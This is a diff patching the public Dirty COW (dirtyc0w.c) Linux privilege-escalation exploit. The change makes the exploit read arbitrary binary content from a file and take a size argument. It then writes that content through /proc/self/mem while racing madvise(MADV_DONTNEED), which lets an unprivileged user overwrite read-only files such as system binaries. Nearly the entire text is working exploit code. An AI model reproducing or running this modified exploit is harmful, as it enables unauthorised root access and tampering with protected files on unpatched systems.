@@ -17,6 +17,7 @@ m00000000000000000
 ####################### dirtyc0w.c #######################
 */
 #include <stdio.h>
+#include <stdlib.h>
 #include <sys/mman.h>
 #include <fcntl.h>
 #include <pthread.h>
@@ -29,7 +30,8 @@ void *map;
 int f;
 struct stat st;
 char *name;
- 
+int size;
+
 void *madviseThread(void *arg)
 {
   char *str;
@@ -46,7 +48,7 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
   }
   printf("madvise %d\n\n",c);
 }
- 
+
 void *procselfmemThread(void *arg)
 {
   char *str;
@@ -60,27 +62,35 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?
 */
   int f=open("/proc/self/mem",O_RDWR);
   int i,c=0;
+  int f2 = open(str, O_RDWR);
+  char buf[1024];
   for(i=0;i<100000000;i++) {
 /*
 You have to reset the file pointer to the memory position.
 */
     lseek(f,(uintptr_t) map,SEEK_SET);
-    c+=write(f,str,strlen(str));
+    lseek(f2,0,SEEK_SET);
+    read(f2, buf, size);
+    c += write(f, buf, size);
+//    c+=write(f,str,size);
+//    c+=write(f,str,strlen(str));
   }
   printf("procselfmem %d\n\n", c);
 }
- 
- 
+
+
 int main(int argc,char *argv[])
 {
 /*
 You have to pass two arguments. File and Contents.
 */
-  if (argc<3) {
+  if (argc<4) {
   (void)fprintf(stderr, "%s\n",
-      "usage: dirtyc0w target_file new_content");
+      "usage: dirtyc0w target_file new_content size");
   return 1; }
   pthread_t pth1,pth2;
+
+  size = atoi(argv[3]);
 /*
 You have to open the file in read only mode.
 */
